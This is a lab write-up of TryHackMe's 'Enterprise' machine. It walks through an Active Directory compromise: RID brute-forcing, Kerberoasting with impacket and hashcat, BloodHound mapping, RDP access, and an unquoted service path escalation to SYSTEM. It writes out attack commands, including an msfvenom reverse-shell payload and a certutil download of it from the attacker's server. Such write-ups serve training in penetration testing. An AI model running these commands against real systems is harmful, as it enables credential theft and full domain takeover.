## Welcome everyone

Today, we will explore “*Enterprise*”, a hard-rated machine from **TryHackMe**.

![image](/THM/Enterprise/Enterprise_images/1.png)

## Information Gathering

First, we could perform an aggressive scan with Nmap with the `-A` switch to gather as much information as possible about the system we’re targeting:

![image](/THM/Enterprise/Enterprise_images/2.png)

Multiple services have been identified. Fundamentals here are:

**DNS** (Port 53)

**HTTP** (Port 80)

**Kerberos** (Port 88)

**RPC** (Port 135)

**NetBIOS** (Port 139)

**LDAP** (Port 389)

**SMB** (Port 445)

**RDP** (3389)

**WinRM** (Port 5985)


It could be deduced from the port scanning that we face an Active Directory environment. The `LAB.ENTERPRISE.thm` **DNS tree** with the `LAB.ENTERPRISE.THM` domain and the `LAB-DC.LAB.ENTERPRISE.thm` FQDN’s **Domain Controller** (`LAB-DC` machine) have been identified by **Nmap Script Engine**’s default scripts (NSE). (added in `/etc/hosts`)

Since we start this box without any credentials, we could attempt to access the **SMB shares** through `smbclient` as anonymous with the `-N` switch. Listing available shares with the `-L` switch reveals an uncommon `Docs` share that allows anonymous access. Moreover, two interestings file that appears to stores credentials are hosted on it:

![image](/THM/Enterprise/Enterprise_images/3.png)

We could download them with the `get` command as above before using libreoffice to open them. However, these files are protected with a password. Attempting to crack it offline through `office2john`/`john` isn’t concludent. Others shares are not very interesting, however, it can be identified that the IPC$ share has read access as anonymous, which mean that we could attempt to retrieve valid usernames from their RID. Moreover, initial valid usernames is a need to attempt any form of attack. So let’s use NetExec (`nxc`) to perform **RID bruteforcing** through the ****`—rid-brute` option in order to retrieve valid domain users through their SID entry (we will run it as the unauthenticated *Guest* user):

![image](/THM/Enterprise/Enterprise_images/4.png)

RID extraction has been successful, allowing us to construct the following users list from fecthed `*SidTypeUser*`:

![image](/THM/Enterprise/Enterprise_images/5.png)

We now have the weapon needed to lead our Active Directory attacks, although no authenticated access is granted yet.



## Initial Access

Since the **Kerberos authentication flow** starts from an ***AS-REQ*** (Request) made generally from a pre-authenticated user to the **Authentication service** (AS) in order to receive a ***Ticket-Granting-Ticket*** (TGT) from the ***Key Distribution Center*** (KDC), owned by the Domain Controller (previously identified as `LAB-DC.LAB.ENTERPRISE.THM`). This step is essential for users to access a service legitimately; it is crucial from a security perspective for obvious reasons.

However, there is a flag in the ***userAccountControl*** attribute of an Active Directory account that, when set on an account, allows to make the KDC skip this **pre**-authentication check entirely during the AS-REQ: this flag is called `DONT_REQUIRE_PREAUTH`. If enabled, an ***AS-REP*** (Reply) could be obtained from the KDC, containing a **Kerberos credential** derived from the victim’s password hash that an attacker could attempt to crack offline through **Hashcat** or **John** **the** **Ripper**.

The Impacket suit contains awesome tools for AD pentesting. For this first exploitation stage, we will use **impacket-GetNPUsers**. The following command could be executed to query the KDC for domain users 

`impacket-GetNPUsers LAB.ENTERPRISE.THM/ -no-pass -usersfile users.txt -dc-ip TARGET_IP`

![image](/THM/Enterprise/Enterprise_images/6.png)

This attack appears irrevelant here; the `DONT_REQUIRE_PREAUTH` flag has not been enabled in the user settings for the target domain. However, since the Guest user has not been disabled, we could leverage the account’s “null session” authenticated context through Kerberos to authenticate to the domain in order to perform **Kerberoasting.**

This attack consists in extracting any potential **TGS-REP** hash among domain users that have a **Service Principal Name** (SPN). A SPN links the domain account concerned with the appropriated service requested by the client so that Kerberos could properly interact with it. Any SPN configured exposes concerned user account to a offline password cracking if the password policies were not applied, such as with the previous AS-REP Roasting attack.

Since the *Guest* default account has remained enabled for authentication, `impacket-GetUserSPNs` tool could be used to authenticate with the DC and attempt to request a TGS to the KDC for all domain users extracted, through the following command:

`impacket-GetUserSPNs LAB.ENTERPRISE.THM/Guest -no-pass -usersfile users.txt -dc-ip <TARGET_IP>`

![image](/THM/Enterprise/Enterprise_images/8.png)

It appears that the bitbucket has a valid SPN, allowing us to recover a TGS-REP hash derived from the user’s password. If password policies were not applied properly, it would allows an attacker to attempt offline password cracking with tools like Hashcat or John The Ripper.

Hashcat was used with the `13100` hash mode which allows cracking TGS-REP (etype 23) hashes.

![image](/THM/Enterprise/Enterprise_images/9.png)

A weak password configuration concerning the *bitbucket* domain user resulted in the password being successfully recovered in plain text. Hence, the  `bloodhound-python` collector has been used to generate a ZIP file uploadable on the BloodHound GUI to map out object relations node within the AD domain.

(`bloodhound-python -u bitbucket -p <PASSWORD> -d LAB.ENTERPRISE.THM -ns <TARGET_IP> -c All --zip`)

![image](/THM/Enterprise/Enterprise_images/10.png)

For some reasons, i encountered file upload issues during this challenge;  `TrustDirection` et `TrustType` fields are provided as numbers instead of strings. The following script command has been used to fix the concerned `.json` file:

![image](/THM/Enterprise/Enterprise_images/11.png)

The newly generated ZIP file could then be imported successfully in the BloodHound GUI, as shown below.

![image](/THM/Enterprise/Enterprise_images/12.png)

After examining the relationships between the objects associated with the *bitbucket* user whose account was just compromised, it was determined that the user belonged to several groups.

![image](/THM/Enterprise/Enterprise_images/13.png)

The bitbucket user is a member of the following domain groups:

- ***Remote Desktop Users***
- ***Domain Users (Default)***
- ***Password-Policy-Exemption***
- ***Sensitive-Account***

The first identified group allows the user to access the system remotely through RDP. This has been leveraged to obtain an initial foothold on the target machine. `xfreerdp` has been used, through the following command:


xfreerdp /v:<TARGET_IP> /u:'bitbucket' /p:'<PASSWORD>' /cert:ignore 

![image](/THM/Enterprise/Enterprise_images/14.png)

Initial access has been successfully granted on the target system. The `user.txt` flag located in the user’s Desktop directory could be accessed.

![image](/THM/Enterprise/Enterprise_images/15.png)

## Privilege Escalation

A local enumeration of the system revealed an Unquoted Path Hijacking vulnerability. This has been identified through the following Living-Off-The-Land command:

`wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """`

![image](/THM/Enterprise/Enterprise_images/19.png)

Inspecting the BINARY_PATH_NAME binary path through `sc.exe` confirms that the quotes were omitted. Moreover, it can be observed that the `zeritieroneservice` service does not run, and is also executed by the highly privileged local account `NT AUTHORITY\SYSTEM` (see line `SERVICE_START_NAME: LocalSystem` below), further demonstrating unnecessary and insecure exposure of an inactive service.

![image](/THM/Enterprise/Enterprise_images/20.png)

Before talking about vulnerability, we had to confirm that the *bitbucket* user had write permissions over the `C:\Program Files (x86)\Zero Tier\Zero Tier One` directory in order to replace the legitimate `ZeroTier One.exe` binary. `icacls` could confirm this — don’t forget the quotes, otherwise it won’t work!

![image](/THM/Enterprise/Enterprise_images/21.png)

Indeed, the `(W)` flag enabled for the `BUILTIN\Users` local group confirms write permissions granted for all users having access to the Domain Controller local system. Moreover, the service's security descriptor (`sc sdshow`) indicates that SID `S-1-5-21-2168718921-3906202695-65158103-1106` has service-specific permissions, including `RP` (SERVICE_START) and `WP` (SERVICE_STOP).
![image](/THM/Enterprise/Enterprise_images/dsl4.png)
BloodHound revealed that the SID concerned is associated with the bitbucket compromised user account.
![image](/THM/Enterprise/Enterprise_images/dsl3.png)


Combined with the previously identified folder write access, this confirms the privilege escalation path. These configurations dangerousely expose the machine to a critical domain privilege escalation through service path hijacking. 

The crux of the vulnerability is that the system will attempt to run several candidates before the expected `ZeroTier One.exe` executable. Here, in the target service path `C:\Program Files (x86)\Zero Tier\ZeroTier One\ZeroTier One.exe`, the system will attempt to execute `C:\\Program.exe`, `C:\Program Files (x86)\\Zero.exe`, `C:\Program Files (x86)\\Zero Tier\\Zero.exe`, `C:\Program Files (x86)\Zero Tier\Zero Tier One\\ZeroTier.exe` first. The last one has been leveraged and resulted in a a successful Unquoted Path Hijacking vulnerability and the write permissions granted on at least one of the three vulnerable folders, malicious code have been imported and executed as a malicious EXE payload generated through `msfvenom`.

Payload Crafting → `msfvenom -p windows/x64/shell/reverse_tcp -f exe LHOST=LOCAL_IP LPORT=4444 -o ZeroTier.exe` 

Payload Transfer → `python3 -m http.server 8000` (attacker)

                              → `certutil -urlcache -f http://LOCAL_IP:8000/ZeroTier.exe` (victim)

![image](/THM/Enterprise/Enterprise_images/22.png)

The `zerotieroneservice` misconfigured service could then be started through the `sc.exe start` command in order to make the malicious payload triggered before the legitimate executable was found, resulting in a successful payload execution with **`LocalSystem`** privileges:

An unquoted service path vulnerability could allows an attacker to replace the original binary with a malicious payload that could be processed with higher privileges, leading to a critical local privilege escalation. Given that this could be done on the controller domain, **Tier Zero** privileges are automatically granted, which represents a critical security risk concerning the whole domain.

![image](/THM/Enterprise/Enterprise_images/24.png)

Full privileges have been granted over the DC machine, and consequently, over the entire LAB.ENTERPRISE.THM domain, resulting in a critical system compromise. (this can be verified through `whoami /priv` and `hostname`)

![image](/THM/Enterprise/Enterprise_images/25.png)

The final flag could be retrieved in the **`Administrator`**’s Desktop directory.

![image](/THM/Enterprise/Enterprise_images/26.png)

Challenge completed.

![image](/THM/Enterprise/Enterprise_images/27.png)

## Conclusion

This challenge demonstrated a complete compromise of an Active Directory environment, starting with unauthenticated enumeration and ending with Domain Controller compromise. First, anonymous SMB access allowed us to enumerate domain users through RID brute-forcing. We then performed Kerberoasting against the `bitbucket` account and cracked its TGS hash offline to recover its password. Using these credentials, we mapped the domain with BloodHound and obtained initial access to the Domain Controller through RDP.

Once on the machine, local Windows enumeration revealed an unquoted service path in the `ZeroTier One` service, combined with excessive write permissions on the corresponding directory. By placing a malicious executable in a location searched before the legitimate binary and starting the vulnerable service, we achieved code execution as `NT AUTHORITY\SYSTEM`. Since this occurred on the Domain Controller, it resulted in full control over the machine and the Active Directory domain.

This challenge highlights how weak credentials, excessive filesystem permissions, and misconfigured Windows services can be chained together to compromise an entire domain.
